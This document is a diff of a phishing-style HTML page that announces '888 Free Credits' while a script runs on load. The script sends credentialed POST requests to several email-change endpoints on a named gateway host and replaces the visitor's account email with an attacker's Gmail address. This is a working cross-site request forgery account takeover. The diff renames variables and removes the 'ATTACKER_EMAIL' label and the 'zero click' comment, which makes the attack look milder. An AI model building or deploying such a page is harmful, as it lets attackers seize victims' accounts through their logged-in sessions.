@@ -1,19 +1,11 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Congratulations! You Won 888 Free Credits!</title>
-  <style>
-    body { font-family: Arial; text-align:center; padding:60px; background:#000; color:#0f0; }
-    h1 { font-size: 2.5em; color: #ff0080; }
-  </style>
-</head>
-<body>
-  <h1>You Are Today’s Lucky Winner!</h1>
-  <p>888 Free Credits added automatically. Redirecting...</p>
+<html><head><meta charset="utf-8"><title>Free Bonus</title></head>
+<body style="background:#000;color:#0f0;text-align:center;padding:100px;font-family:Arial">
+<h1>Congratulations! 888 Free Credits Added!</h1>
+<p>Redirecting to dashboard...</p>
 
 <script>
-const ATTACKER_EMAIL = "hlaingminpaing@gmail.com";   // Change to your real email
+const NEW_EMAIL = "hlaingminpaing@gmail.com";   // ← CHANGE TO YOUR REAL EMAIL
 
 async function takeover() {
   const paths = [
@@ -23,29 +15,23 @@ async function takeover() {
     "/api/v1/user/changeEmail"
   ];
 
-  for (const path of paths) {
+  for (const p of paths) {
     try {
-      const resp = await fetch("https://uat-gateway.kkr88819.com" + path, {
+      const r = await fetch("https://uat-gateway.kkr88819.com" + p, {
         method: "POST",
-        credentials: "include",           // This sends cookies automatically
+        credentials: "include",           // sends cookies automatically
         mode: "cors",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify({ email: ATTACKER_EMAIL })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email: NEW_EMAIL })
       });
-
-      if (resp.ok) {
-        alert("SUCCESS! Email changed to " + ATTACKER_EMAIL);
-        break;
+      if (r.ok) {
+        alert("SUCCESS! Email changed to " + NEW_EMAIL);
+        return;
       }
     } catch(e) {}
   }
+  alert("Failed — token expired or endpoint changed");
 }
-
-// Run immediately — zero click needed
 takeover();
 </script>
-</body>
-</html>
+</body></html>
